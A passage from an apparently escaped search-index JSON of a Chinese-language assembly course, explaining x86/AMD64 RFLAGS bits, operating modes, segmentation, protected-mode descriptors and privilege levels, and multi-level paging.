(bit 10): Direction Flag \u63a7\u5236\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u7684\u9012\u589e/\u9012\u51cf\u65b9\u5411</li> <li>I (bit 9): Interrupt Flag \u63a7\u5236\u662f\u5426\u5141\u8bb8\u786c\u4ef6\u4e2d\u65ad</li> <li>T (bit 8): Trap Flag \u8bbe\u7f6e CPU \u8fd0\u884c\u6a21\u5f0f<ul> <li>\u5f53\u00a0<code>TF=1</code>\u00a0\u65f6\uff0cCPU \u8fdb\u884c\u5355\u6b65\u6a21\u5f0f</li> <li>\u5f53\u00a0<code>TF=0</code>\u00a0\u65f6\uff0cCPU \u8fdb\u884c\u5e38\u89c4\u6a21\u5f0f</li> </ul> </li> <li>VM (bit 17): Virtual Mode \u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u9009\u62e9 Virtual Mode Operation</li> <li>IOPL (bit 12, 13): \u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u9009\u62e9 I/O \u8bbe\u5907\u7684\u7279\u6743\u9636\u7ea7</li> <li>NT (bit 14): Nested Task \u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u5f53\u524d Task \u662f\u5728\u53e6\u4e00\u4e2a Task \u7684\u5d4c\u5957\u4e2d\u5219\u4e3a 1</li> <li>AC (bit 18): Alignment Check \u5982\u679c AC \u7f6e 1\uff0c\u4e14 CPU \u7684\u5bf9\u9f50\u68c0\u67e5\u673a\u5236\u5f00\u542f\uff0c\u5219\u4f1a\u5bf9\u8bbf\u95ee\u5730\u5740\u8fdb\u884c\u5bf9\u9f50\u68c0\u67e5\uff0c\u5931\u8d25\u5219\u89e6\u53d1\u5f02\u5e38<ul> <li>\u4f8b\u5982\uff0c\u8bbf\u95ee <code>int a</code>(4 Bytes) \u65f6\uff0c\u5730\u5740\u5e94\u8be5\u4e3a 4 \u7684\u500d\u6570\uff0c\u4f8b\u5982 <code>0x1000</code>\uff0c\u6b64\u65f6\u8bbf\u95ee <code>0x1002</code> \u5c31\u4f1a\u629b\u51fa\u5f02\u5e38</li> </ul> </li> <li>RF (bit 16): Resume \u63a7\u5236 CPU \u5728\u5355\u6b65\u8c03\u8bd5\u6216\u65ad\u70b9\u540e\u5982\u4f55\u7ee7\u7eed\u6267\u884c</li> <li>ID (bit 21): Identification \u7528\u4e8e\u6d4b\u8bd5 CPU \u662f\u5426\u652f\u6301 <code>CPUID</code> \u6307\u4ee4\uff0c\u5982\u679c\u652f\u6301\uff0c\u5219\u8be5\u4f4d\u53ef\u4ee5\u88ab\u8f6f\u4ef6\u8bfb\u5199\uff1b\u5982\u679c\u4e0d\u884c\uff0c\u5219\u5199\u8fd9\u4e2a\u4f4d\u65e0\u6548</li> <li>VIF (bit 19): Virtual Interrupt Flag \u5728 Virtual-8086 Mode \u548c\u591a\u4efb\u52a1\u73af\u5883\u4e0b\u7684\u4e2d\u65ad\u6807\u5fd7</li> <li>VIP (bit 20): Virtual Interrupt Pending \u8868\u793a\u662f\u5426\u6709\u865a\u62df\u4e2d\u65ad\u6b63\u5728\u7b49\u5f85\u5904\u7406</li> </ul> <p>\u65e9\u671f CPU \u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf RFLAGS \u4e2d\u54ea\u4e9b\u4f4d\u53ef\u4ee5\u88ab\u4fee\u6539\u6765\u5224\u65ad CPU \u5c5e\u4e8e\u54ea\u4e00\u4ee3</p>"},{"location":"Courses/asm/ch2/#operating-mode","title":"Operating Mode","text":"<p>Long Mode\uff08\u5728 Intel \u4e2d\u5bf9\u5e94 IA-32e\uff09\u662f Legacy Protected Mode \u7684\u62d3\u5c55\uff0c\u5b83\u5305\u542b\u4e86\u4e24\u4e2a\u5b50\u6a21\u5f0f 64-Bit Mode \u548c Compatibility Mode\uff1a</p> <ul> <li>64-Bit Mode \u652f\u6301 64-bit \u67b6\u6784\u7684\u6240\u6709\u7279\u6027\u548c\u5bc4\u5b58\u5668\u62d3\u5c55</li> <li>Compatibility Mode \u652f\u6301\u73b0\u5b58 16-bit \u548c 32-bit \u5e94\u7528\u7684\u4e8c\u8fdb\u5236\u517c\u5bb9</li> </ul> <p>Long Mode \u5e76\u4e0d\u652f\u6301 Legacy Real Mode \u548c Legacy Virtual-8086 Mode\uff0c\u56e0\u6b64\u4e0d\u80fd\u7b80\u5355\u629b\u5f03 Legacy Mode</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u6a21\u5f0f System management mode\uff08SMM\uff09\uff0c\u5b83\u6700\u521d\u662f\u7528\u6765\u9002\u914d\u5e73\u53f0\u7684\u56fa\u4ef6\u4ee5\u53ca\u7279\u5b9a\u7684\u5e95\u5c42\u786c\u4ef6\u9a71\u52a8\u7684\u3002\u5728 AMD64 \u67b6\u6784\u4e0b\uff0c\u4e0d\u540c Operating Mode \u7684\u5207\u6362\u5982\u4e0b\uff1a</p> <p></p> <p><code>RSM</code> \u8868\u793a\u9000\u51fa SMM\uff0c\u4ece\u54ea\u91cc\u8fdb\u5165 SMM \u7684\u5c31\u4f1a\u9000\u56de\u5230\u54ea\u4e2a\u6a21\u5f0f</p>"},{"location":"Courses/asm/ch2/#memory-management","title":"Memory Management","text":"<p>Memory Mangement \u901a\u5e38\u9700\u8981\u6ee1\u8db3 Relocation\uff0cProtection\uff0cSharing \u4e09\u4e2a\u8981\u6c42\uff1a</p> \u8981\u6c42 \u542b\u4e49 \u91cd\u5b9a\u4f4d\uff08Relocation\uff09 \u7a0b\u5e8f\u53ef\u4ee5\u5728\u5185\u5b58\u4e2d\u4efb\u4f55\u4f4d\u7f6e\u88c5\u5165\u548c\u6267\u884c\uff0c\u9700\u8981\u5730\u5740\u6620\u5c04\u673a\u5236\u3002 \u4fdd\u62a4\uff08Protection\uff09 \u9632\u6b62\u4e00\u4e2a\u8fdb\u7a0b\u8bbf\u95ee\u6216\u4fee\u6539\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u7a7a\u95f4\u3002 \u5171\u4eab\uff08Sharing\uff09 \u5141\u8bb8\u591a\u4e2a\u8fdb\u7a0b\u5b89\u5168\u5730\u5171\u4eab\u76f8\u540c\u7684\u4ee3\u7801\u6216\u6570\u636e\u3002 <p>\u5176\u4e2d\uff0cSegmentation \u548c Paging \u662f\u6700\u4e3b\u6d41\u7684\u4e24\u79cd Memory Management Schemes\uff0c\u8fd9\u91cc\u7b80\u8981\u5bf9\u4e8c\u8005\u8fdb\u884c\u4e00\u4e9b\u5bf9\u6bd4\uff1a</p> \u5bf9\u6bd4\u9879\u76ee \u5206\u6bb5\uff08Segmentation\uff09 \u5206\u9875\uff08Paging\uff09 \u5927\u5c0f\uff08Size\uff09 \u6bb5\u7684\u5927\u5c0f\u53ef\u53d8\uff0c\u7531\u7528\u6237\u6216\u7f16\u8bd1\u5668\u51b3\u5b9a\uff08\u4f8b\u5982\uff1a\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u3001\u5806\u6808\u6bb5\uff09\u3002 \u9875\u7684\u5927\u5c0f\u56fa\u5b9a\uff08\u4f8b\u5982 4KB\u30018KB\uff09\uff0c\u7531\u786c\u4ef6\u51b3\u5b9a\u3002 \u788e\u7247\uff08Fragmentation\uff09 \u5bb9\u6613\u4ea7\u751f\u5916\u90e8\u788e\u7247\uff08\u56e0\u4e3a\u4e0d\u540c\u6bb5\u5927\u5c0f\u4e0d\u4e00\uff0c\u5185\u5b58\u5206\u914d\u4e0d\u8fde\u7eed\uff09\u3002 \u5bb9\u6613\u4ea7\u751f\u5185\u90e8\u788e\u7247\uff08\u56e0\u4e3a\u6700\u540e\u4e00\u9875\u53ef\u80fd\u6ca1\u88ab\u5b8c\u5168\u7528\u5b8c\uff09\u3002 \u8868\u7ed3\u6784\uff08Tables\uff09 \u4f7f\u7528\u6bb5\u8868\uff08Segment Table\uff09\uff0c\u8bb0\u5f55\u6bcf\u4e2a\u6bb5\u7684\u57fa\u5740\u548c\u957f\u5ea6\uff0c\u67e5\u627e\u901f\u5ea6\u8f83\u5feb\u3002 \u4f7f\u7528\u9875\u8868\uff08Page Table\uff09\uff0c\u8bb0\u5f55\u9875\u53f7\u5bf9\u5e94\u7684\u7269\u7406\u5757\u53f7\u3002\u67e5\u627e\u76f8\u5bf9\u8f83\u6162\uff0c\u4f46TLB\uff08Translation Lookaside Buffer\uff09\u53ef\u52a0\u901f\u3002 Legacy-Mode Memory ManagementLong-Mode Memory Management <p></p> <p></p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u5982\u4e0b\u51e0\u4e2a terms \u6765\u6307\u4ee3\u5404\u79cd\u4e0d\u540c\u5730\u5740\uff1a</p> <ul> <li>Effective Addresses or Segment Offsets<ul> <li>\u6bb5\u5185\u504f\u79fb\u5730\u5740</li> </ul> </li> <li>Logical Addresses<ul> <li>\u903b\u8f91\u5730\u5740\uff0c\u8868\u793a\u5f62\u5f0f\u7c7b\u4f3c <code>Seg:Offset</code></li> </ul> </li> <li>Linear Addresses<ul> <li>\u7ebf\u6027\u5730\u5740\uff0c\u76f8\u5f53\u4e8e\u903b\u8f91\u5730\u5740\u7684\u8f6c\u8bd1\uff0c\u662f\u8fde\u7eed\u7684\u5730\u5740</li> <li>\u5982\u679c\u542f\u7528\u4e86 Paging\uff0cLinear Addresses \u76f8\u5f53\u4e8e\u865a\u62df\u5730\u5740 Virtual Addresses</li> </ul> </li> <li>Physical Addresses<ul> <li>\u7269\u7406\u5730\u5740\uff0c\u5728 Memory \u4e2d\u7684\u771f\u5b9e\u5185\u5b58\u5e03\u5c40</li> </ul> </li> </ul>"},{"location":"Courses/asm/ch2/#real-mode-memory-addressing","title":"Real Mode Memory Addressing","text":"<p>Real Mode \u7684\u5730\u5740\u7a7a\u95f4\u53ea\u6709 1MB \u5927\u5c0f\uff0c\u5373 \\(2^{20}\\) byte\u3002\u5b83\u7684 Linear Address \u7684\u8ba1\u7b97\u4e3a\uff1a</p> \\[ \\text{Seg} \\times 10h + \\text{Offset} \\] <p>\u4e58\u4e0a \\(10h\\)\uff0c\u7b49\u4ef7\u4e8e\u5de6\u79fb 4 \u4f4d</p> <p>Real Mode \u4e2d\uff0c\u6bb5\u5bc4\u5b58\u5668\u548c\u504f\u79fb\u5bc4\u5b58\u5668\u90fd\u662f 16-bit \u7684\uff0c\u56e0\u6b64\u504f\u79fb\u540e\u76f8\u52a0\u5f97\u5230\u7684\u5730\u5740\u662f 20-bit \u7684</p> <p>1 MB Address Wrap-Around \u662f\u8fd9\u4e2a\u8bbe\u8ba1\u5f88\u7ecf\u5178\u7684\u95ee\u9898\u3002\u5f53 Linear Address \u8ba1\u7b97\u6700\u9ad8\u4f4d\u8fdb\u4f4d\u65f6\uff0c\u7269\u7406\u5730\u5740\u53d1\u751f overflow\uff0c\u53cd\u800c\u53d8\u5f97\u5f88\u5c0f\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u56de\u73af\u3002\u53ef\u4ee5\u8003\u8651\u5982\u4e0b\u5de6\u53f3\u4e24\u4e2a\u4f8b\u5b50\uff1a</p> <p></p> <p>\u7531\u4e8e\u6709\u76f8\u5f53\u6570\u91cf\u7684\u5546\u4e1a\u8f6f\u4ef6\u7279\u610f\u4f7f\u7528\u4e86\u8fd9\u4e2a\u7279\u6027\uff0c\u540e\u7eed\u7684 8086/8088/80186 CPU \u90fd\u4fdd\u7559\u4e86\u8fd9\u70b9\u3002</p>"},{"location":"Courses/asm/ch2/#protected-mode-memory-addressing","title":"Protected Mode Memory Addressing","text":"<p>\u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u6bb5\u5bc4\u5b58\u5668\u4e0d\u518d\u5355\u7eaf\u5b58\u50a8\u6bb5\u5730\u5740\uff0c\u800c\u662f\u5b58\u50a8\u6307\u5411 Descriptor Table \u4e2d\u7684\u67d0\u4e00\u63cf\u8ff0\u7b26\u7684 Selector\u3002</p> <p>\u4f8b\u5982\u5bf9\u4e8e\u6307\u4ee4 <code>MOV [BX], AX</code>\uff0c\u5b83\u7684\u8bbf\u5b58\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p></p> <p>Descriptor \u63cf\u8ff0\u4e86\u4e00\u4e2a\u5185\u5b58\u6bb5\u7684\u5730\u5740\uff0c\u957f\u5ea6\u4ee5\u53ca\u8bbf\u95ee\u6743\u9650\uff0c\u5b83\u7684\u7ed3\u6784\u968f\u7740\u67b6\u6784\u7684\u5347\u7ea7\u53d8\u66f4\u5982\u4e0b\uff1a</p> <p></p> <p>\u5176\u4e2d Base \u90e8\u5206\u6307\u5b9a\u4e86\u8fd9\u4e2a\u6bb5\u7684\u8d77\u59cb\u4f4d\u7f6e\uff0cLimit \u90e8\u5206\u6307\u5b9a\u4e86\u8fd9\u4e2a\u6bb5\u7684\u957f\u5ea6\uff08\u4e5f\u53ef\u4ee5\u8bf4\u662f\u7ed3\u675f\u90e8\u5206\uff09\u3002G \u4ee3\u8868\u4e86 Granularity Bit\uff0c\u5b83\u51b3\u5b9a\u4e86\u8be5\u6bb5 Limit \u7684\u7f29\u653e\u7a0b\u5ea6\uff1a</p> <ul> <li>\u5f53 G=0\uff0c\u6bb5\u7684\u957f\u5ea6\u4e3a \\((\\text{limit}+1)\\ \\text{bytes}\\)<ul> <li>\u6b64\u65f6 limit \u7684\u8303\u56f4\u4e3a 0 - \\(2^{20}-1\\)</li> </ul> </li> <li>\u5f53 G=1\uff0c\u6bb5\u7684\u957f\u5ea6\u4e3a\\((\\text{limit}+1)\\times 4K\\ \\text{bytes}\\)<ul> <li>\u4e5f\u53ef\u4ee5\u8ba4\u4e3a\u5c06 limit \u66ff\u6362\u4e3a \\(\\text{limit}&lt;&lt;12 + 0xFFF\\)</li> <li>\u6b64\u65f6 limit \u7684\u8303\u56f4\u4e3a 0FFFH - \\(2^{32}-1\\)</li> </ul> </li> </ul> <p>\u3010Example\u3011 \u6709\u4e00\u4e2a\u63cf\u8ff0\u7b26\uff0cbase address = 1000,0000H, limit = 01FFH\uff0c\u6c42 G \u5206\u522b\u4e3a 0 \u548c 1 \u65f6\u7684\u6bb5\u8d77\u59cb\u4f4d\u7f6e\u548c\u7ed3\u675f\u4f4d\u7f6e\uff1a</p> <ul> <li>\u5f53 G=0<ul> <li>Starting Location = 1000,0000H</li> <li>Ending Location = 1000,0000H + 01FFH = 1000,01FFH</li> </ul> </li> <li>\u5f53 G=1<ul> <li>Starting Location = 1000,0000H</li> <li>Ending Location = 1000,0000H + 01F,FFFFH = 101F,FFFFH</li> </ul> </li> </ul> <p>1 Byte \u5927\u5c0f\u7684 Access Rights \u6307\u5b9a\u4e86\u8fd9\u4e2a\u6bb5\u7684\u6743\u9650\u63a7\u5236\uff1a</p> <p></p> <p>\u5176\u4e2d DPL \u5b57\u6bb5\u5171 2-bit\uff0c\u6307\u5b9a\u4e86\u8be5\u6bb5\u7684 Priviledge-Level\u3002\u7279\u6743\u7b49\u7ea7\u5171\u5206 4 \u7ea7\uff0c\u6309\u7167\u6570\u5b57\u5927\u5c0f\u6743\u9650\u4f9d\u6b21\u964d\u4f4e\uff1a</p> <p></p> <p>Descriptor Tables \u5206\u4e3a Global-Descriptor Table\uff08GDT\uff09\u3001Local-Descriptor Table\uff08LDT\uff09\u3001Interrupt-Descriptor Table\uff08IDT\uff09 \u4e09\u7c7b\uff0c\u5176\u4e2d LDT \u9700\u8981\u901a\u8fc7\u8bbf\u95ee GDT \u4e2d\u7684 entry \u6765\u95f4\u63a5\u8bbf\u95ee\uff0c\u8fd9\u4e00\u70b9\u6211\u4eec\u4f1a\u5728\u7a0d\u540e\u8c08\u53ca\u3002</p> <p>Selector \u5b58\u50a8\u5728 16-bit \u7684\u6bb5\u5bc4\u5b58\u5668\u4e2d\uff0c\u5b83\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <p></p> <p>TI \u6307\u5b9a\u4e86\u662f\u8981\u8bbf\u95ee GDT \u8fd8\u662f LDT\uff1bRPL \u6307\u5b9a\u4e86\u6b64\u6b21\u8bf7\u6c42\u7684\u7279\u6743\u9636\u7ea7\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u6bb5\u5bc4\u5b58\u5668 <code>CS</code> \u4e2d\u6700\u4f4e\u4e24\u4f4d\u4e0d\u4e3a RPL\uff0c\u4e3a Current Privilege-Level\uff08CPL\uff09\uff0cCPL \u7684\u503c\u6c38\u8fdc\u4e3a CPU \u5f53\u524d\u7684\u7279\u6743\u9636\u7ea7\u3002\u7efc\u5408\u4e0b\u6765\uff0c\u5173\u4e8e Descriptor \u548c Selector \u4e2d\u7684\u4e09\u79cd\u7279\u6743\u9636\u7ea7\u8868\u793a\u4f4d\u7684\u5173\u7cfb\u4e0e\u533a\u522b\u5982\u4e0b\uff1a</p> <p></p> <p>\u5728\u8fdb\u884c\u6570\u636e\u8bbf\u95ee\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4f1a\u5bf9\u6743\u9650\u8fdb\u884c\u68c0\u67e5\uff1a</p> Accessing Data SegmentsAccessing Stack Segments <p>\u5f53\u8bbf\u95ee\u6570\u636e\u6bb5\u65f6\uff0c\u6211\u4eec\u8981\u6c42 CPL \u548c RPL \u7684\u6743\u9650\u90fd\u9ad8\u4e8e\u8be5\u6bb5\u7684 DPL\uff1a</p> <p></p> <p>\u5f53\u8bbf\u95ee\u6808\u6bb5\u65f6\uff0c\u6211\u4eec\u8981\u6c42 CPL \u548c RPL \u7684\u6743\u9650\u90fd\u7b49\u4e8e\u8be5\u6bb5\u7684 DPL\uff1a</p> <p></p> <p>\u4e3a\u4e86\u5b58\u50a8 Descriptor Tables \u7684\u57fa\u5730\u5740\uff0c\u5904\u7406\u5668\u4e2d\u6709 4 \u79cd\u7528\u6237\u4e0d\u53ef\u89c1\u7684\u5bc4\u5b58\u5668\uff1a</p> <ul> <li>GDTP and IDTR\uff1a\u5b58\u50a8 GDT \u548c IDT \u7684 Base \u548c Limit\uff0c\u5728\u8fdb\u5165\u4fdd\u62a4\u6a21\u5f0f\u4e4b\u524d\u5c31\u88ab\u52a0\u8f7d</li> <li>LDTR and TR\uff1a\u6307\u5411 GDT \u4e2d\u7279\u6b8a\u7684\u63cf\u8ff0\u7b26<ul> <li>\u4f8b\u5982 LDTR \u6307\u5411 GDT \u4e2d\u7684\u6307\u5411 LDT \u7684\u63cf\u8ff0\u7b26</li> </ul> </li> </ul> <p>\u8fd8\u6709\u4e00\u4e9b\u4e0d\u53ef\u89c1\u7684\u5bc4\u5b58\u5668\u7528\u4f5c Descriptor Cache</p> <p>\u5f53\u9700\u8981\u53d1\u751f\u8fdb\u7a0b\u5207\u6362\u65f6\uff0cLDTR \u4f1a\u52a0\u8f7d\u65b0\u4efb\u52a1\u5bf9\u5e94\u7684 selector \u503c\uff0c\u4ece\u800c\u5229\u7528 LDT \u5b9e\u73b0\u6269\u5c55\u5185\u5b58\u7a7a\u95f4\u3002</p> <p></p> <p>\u5de6\u4e0b\u89d2\u5bf9 index \u4e58 8 \u662f\u56e0\u4e3a Descriptor Table \u4e2d\u4e00\u4e2a entry \u662f 8 Byte</p> \u56fe\u4e2d gdtr or ldtr \u90e8\u5206\u7684\u5177\u4f53\u5b9e\u73b0\u5982\u56fe <p></p> <p>\u5728\u4fdd\u62a4\u6a21\u5f0f\u4e0b\uff0c\u5206\u6bb5\u5185\u5b58\u6a21\u578b Segmented-Memory Models \u6709\u4e24\u79cd\uff1a</p> \u6a21\u578b \u8bf4\u660e \u7279\u70b9 \u591a\u6bb5\u6a21\u578b (Multi-Segmented Model) \u628a\u5185\u5b58\u5206\u6210\u591a\u4e2a\u72ec\u7acb\u7684\u6bb5\uff0c\u6bd4\u5982\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u3001\u5806\u6808\u6bb5\u7b49\u3002\u6bcf\u4e2a\u6bb5\u6709\u81ea\u5df1\u7684\u57fa\u5740\u548c\u754c\u9650\u3002 \u2705 \u6bcf\u4e2a\u6bb5\u53ef\u4ee5\u72ec\u7acb\u7ba1\u7406\u3001\u4fdd\u62a4\u4e0e\u5171\u4eab\u3002\u274c \u5730\u5740\u8f6c\u6362\u66f4\u590d\u6742\uff0c\u8f6f\u4ef6\u9700\u8981\u7ba1\u7406\u591a\u4e2a\u6bb5\u5bc4\u5b58\u5668\u3002 \u5e73\u5766\u6a21\u578b (Flat-Memory Model) \u628a\u6240\u6709\u6bb5\u7684\u57fa\u5740\u90fd\u8bbe\u4e3a 0\uff0c\u754c\u9650\u8bbe\u4e3a\u6574\u4e2a\u5730\u5740\u7a7a\u95f4\u957f\u5ea6\uff08\u4f8b\u5982 4GB\uff09\u3002\u8fd9\u6837\u6240\u6709\u5185\u5b58\u90fd\u8fde\u7eed\u53ef\u5bfb\u3002 \u2705 \u770b\u8d77\u6765\u5c31\u50cf\u201c\u6ca1\u6709\u5206\u6bb5\u201d\uff0c\u53ea\u6709\u4e00\u4e2a\u8fde\u7eed\u7684\u7ebf\u6027\u5730\u5740\u7a7a\u95f4\u3002\u2705 \u7f16\u7a0b\u66f4\u7b80\u5355\uff0c\u73b0\u4ee3 OS\uff08\u5982 Linux\u3001Windows\uff09\u5927\u591a\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u3002 <p></p>"},{"location":"Courses/asm/ch2/#memory-paging","title":"Memory Paging","text":"<p>Paging \u5c06\u5185\u5b58\u5212\u5206\u4e3a\u7edf\u4e00\u5927\u5c0f\u7684 Page\uff0c\u901a\u5e38\uff1a</p> <ul> <li>\u5728 long mode, physical pages \u957f\u5ea6\u53ef\u4e3a 4-KByte, 2-MByte, 1-GByte</li> <li>\u5728 legacy mode\uff0cphysical pages \u957f\u5ea6\u53ef\u4e3a 4-KByte, 2-MByte, 4-MByte</li> </ul> <p>\u4e0e\u8ba1\u7ec4\u4e2d\u5b66\u5230\u7684\u5206\u9875\u7a0d\u6709\u533a\u522b\u7684\u662f\uff0c\u73b0\u5b9e CPU \u901a\u5e38\u4f1a\u91c7\u7528 Multi-level Paging\uff0c\u800c\u4e0d\u662f\u53ea\u901a\u8fc7\u4e00\u4e2a Page Table \u5c31\u80fd\u8f6c\u6362\u865a\u62df\u5730\u5740\u548c\u7269\u7406\u5730\u5740\u3002\u8fd9\u662f\u56e0\u4e3a Single-level \u5f80\u5f80\u5360\u7528\u592a\u591a\u5185\u5b58\u3002</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e 64-bit computer\uff0c\u5047\u5b9a\u6211\u4eec\u8bbe\u7f6e 4KB page size, 4GB physical memory, 4Byte per page table entry\uff0c\u90a3\u4e48 \\(\\text{Page Offset}= \\log_2 4K=12\\ bits\\)\uff0c\u90a3\u4e48 \\(\\text{Virtual Page Number} = 64-12=52\\ bits\\)\uff0c\u4e00\u4e2a entry \u6709 4B\uff0c\u90a3\u4e48\u6574\u4e2a Page Table \u5360\u7528\u5185\u5b58 \\(2^{52}\\times 4= 2^{54}\\ bytes\\)\uff0c\u8fd9\u5df2\u7ecf\u662f\u7269\u7406\u5185\u5b58 4GB\uff08\\(2^{32}\\)\uff09 \u7684\u4e0d\u77e5\u9053\u591a\u5c11\u500d\u4e86\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u4f7f\u7528 Multi-level Paging \u6280\u672f\u3002\u901a\u5e38\uff0c\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a Page Table \u7684\u5927\u5c0f\u7b49\u540c\u4e8e\u4e00\u4e2a Page \u7684\u5927\u5c0f\uff0c\u5bf9\u4e8e\u8be5\u4f8b\u5373\u4e3a 4KB\u3002\u6b64\u65f6\u4e00\u4e2a Page Table \u5171\u6709 4KB / 4B = 1024 \u4e2a entries\u3002</p> <p>1024 \u4e2a entries \u610f\u5473\u7740\u6211\u4eec\u53ea\u9700\u8981 10-bit \u5c31\u80fd\u5bf9\u4e00\u4e2a Page Table \u8fdb\u884c\u7d22\u5f15\uff0c\u90a3\u4e48\u5c42\u6570\u8ba1\u7b97\u5219\u4e3a \\(\\#\\text{ of Level}= \\frac{52}{10}\\ \\text{ceiled is } 6\\)\uff0c\u5373\u5171\u9700\u8981 6 \u5c42\uff0c\u5176\u7d22\u5f15\u7ed3\u6784\u7c7b\u4f3c\u5982\u4e0b\uff1a</p> <p></p> <p>Key Points</p> <ul> <li>\u6240\u6709 Page Table \u7684 entry size \u5747\u9700\u76f8\u540c</li> <li>Page Table \u7531\u5185\u5230\u5916\u5206\u522b\u79f0\u4e3a<ul> <li>Page Table, PT</li> <li>Page Directory, PD</li> <li>Page Directory Pointer Table, PDPT</li> </ul> </li> </ul> \ud83c\udf1f \u7c7b\u522b \ud83d\udfe2 \u4f18\u70b9 (Pros) \ud83d\udd34 \u7f3a\u70b9 (Cons) \u5185\u5b58\u5360\u7528 \u4ec5\u4e3a\u5b9e\u9645\u4f7f\u7528\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5206\u914d\u9875\u8868\uff0c\u8282\u7701\u5927\u91cf\u5185\u5b58 \u9875\u8868\u7ed3\u6784\u672c\u8eab\u66f4\u590d\u6742\uff0c\u9700\u8981\u989d\u5916\u7684\u76ee\u5f55\u9875\u8868\uff0c\u5360\u7528\u5c11\u91cf\u989d\u5916\u7a7a\u95f4 \u7a00\u758f\u5730\u5740\u7a7a\u95f4\u652f\u6301 \u5bf9\u4e8e\u7a00\u758f\u5185\u5b58\u4f7f\u7528\u7684\u8fdb\u7a0b\u975e\u5e38\u9ad8\u6548\uff0c\u4e0d\u4f1a\u4e3a\u7a7a\u6d1e\u5730\u5740\u8303\u56f4\u6d6a\u8d39\u9875\u8868\u9879 \u82e5\u8fdb\u7a0b\u4f7f\u7528\u5730\u5740\u7a7a\u95f4\u975e\u5e38\u5bc6\u96c6\uff0c\u591a\u7ea7\u9875\u8868\u8282\u7701\u7684\u7a7a\u95f4\u4f18\u52bf\u4e0d\u660e\u663e \u53ef\u6269\u5c55\u6027 \u9002\u7528\u4e8e\u5927\u578b\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff08\u5982 32 \u4f4d\u300164 \u4f4d\u7cfb\u7edf\uff09 \u968f\u5c42\u6570\u589e\u52a0\uff0c\u9875\u8868\u67e5\u627e\u8fc7\u7a0b\u66f4\u957f\u3001\u66f4\u6162 \u8bbf\u95ee\u901f\u5ea6 \u2014\u2014 \u6bcf\u589e\u52a0\u4e00\u7ea7\u9875\u8868\uff0c\u5c31\u9700\u8981\u591a\u4e00\u6b21\u5185\u5b58\u8bbf\u95ee\u624d\u80fd\u5b8c\u6210\u5730\u5740\u8f6c\u6362 \u6027\u80fd\u4f18\u5316 \u53ef\u4e0e TLB\uff08Translation Lookaside Buffer\uff09 \u914d\u5408\u4f7f\u7528\uff0c\u663e\u8457\u51cf\u5c11\u67e5\u627e\u5ef6\u8fdf \u82e5 TLB \u547d\u4e2d\u7387\u4f4e\uff0c\u4f1a\u51fa\u73b0\u660e\u663e\u6027\u80fd\u4e0b\u964d <p>Paging \u4e3a OS \u63d0\u4f9b\u4e86\u5c06\u865a\u62df\u5730\u5740\u8f6c\u6362\u4e3a\u7269\u7406\u5730\u5740\uff08Relocation\uff09\u7684\u62bd\u8c61\u5c42\uff0c\u56e0\u6b64\u4e0d\u540c\u5e94\u7528\u53ef\u4ee5\u4f7f\u7528\u5404\u81ea\u9694\u79bb\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff08Protection\uff09\uff0c\u591a\u4e2a\u5e94\u7528\u8fd8\u53ef\u4ee5\u901a\u8fc7 Shared Mapping \u5171\u4eab\u540c\u4e00\u4e2a\u7269\u7406\u9875\uff08Sharing\uff09\u3002</p> <p>\u4e0e\u5206\u6bb5\u6a21\u5f0f\u76f8\u540c\uff0cPaging \u4e5f\u9700\u8981\u505a\u4e00\u4e9b\u6743\u9650\u4fdd\u62a4\uff0c\u8fd9\u4e9b\u7528\u4e8e\u7ef4\u62a4\u6743\u9650\u7684\u4f4d\u5904\u4e8e\u9875\u8868\u7684 Entry \u4e2d\u3002\u4f8b\u5982\uff0cPage-Directory Entry \u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <p></p> <p>\u90fd\u662f 0 \u8868\u793a\u9ad8\u6743\u9650\u7b49\u7ea7\uff0c1 \u8868\u793a\u4f4e\u6743\u9650\u7b49\u7ea7\uff08\u8fd9\u5757\u80fd Write\uff0c\u8bf4\u660e\u8fd9\u5757\u6743\u9650\u7b49\u7ea7\u4f4e\uff09</p> <p>\u5728 Multi-Paging \u4e0b\uff0c\u4e00\u4e2a\u7269\u7406\u9875\u7684\u6700\u7ec8\u6743\u9650\u662f\u5bfc\u5411\u5b83\u7684 PDE \u548c PTE \u6743\u9650\u4f4d\u7684 AND\uff1a</p> \\[ \\text{Page Attribute = PDE Attribute \\&amp; PTE Attribute} \\] <p>Paging \u4f7f\u7528 CR0-CR4 \u51e0\u4e2a Control Registers \u6765\u5bf9\u5206\u9875\u8fdb\u884c\u63a7\u5236\uff0c\u5b83\u4eec\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <p></p> <ul> <li>Control Register 0: \u4e3b\u8981\u5305\u62ec\u5206\u9875\u76f8\u5173\u63a7\u5236\u4f4d<ul> <li>PE(bit 0) \u662f\u5426\u542f\u7528\u4fdd\u62a4\u6a21\u5f0f\u3002\u5f53 PE = 1 \u65f6\u4f1a\u4ece Real Mode \u8fdb\u5165 Protected Mode</li> <li>PG(bit 31) \u662f\u5426\u542f\u7528\u5206\u9875\u3002\u8be5\u4f4d\u5728\u8fdb\u51fa Long Mode 